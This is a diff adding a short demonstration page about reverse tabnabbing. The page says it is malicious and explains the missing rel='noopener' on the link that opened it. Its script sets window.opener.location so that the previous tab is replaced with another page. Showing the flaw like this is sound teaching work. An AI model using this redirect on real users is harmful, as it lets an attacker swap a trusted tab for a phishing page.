@@ -1,0 +1,13 @@
+<html>
+  <head>
+    <title>Exploiting target=_blank opener</title>
+  </head>
+  <body>
+    <h1>This is a malicious page</h1>
+    <p>If your previous tab has changed, the link that took you here was unsafe because it did not use rel="noopener".</p>
+  </body>
+  <script>
+    // try to change the previous page by manipulating its window object
+    window.opener.location = 'malicious.html'
+  </script>
+</html>
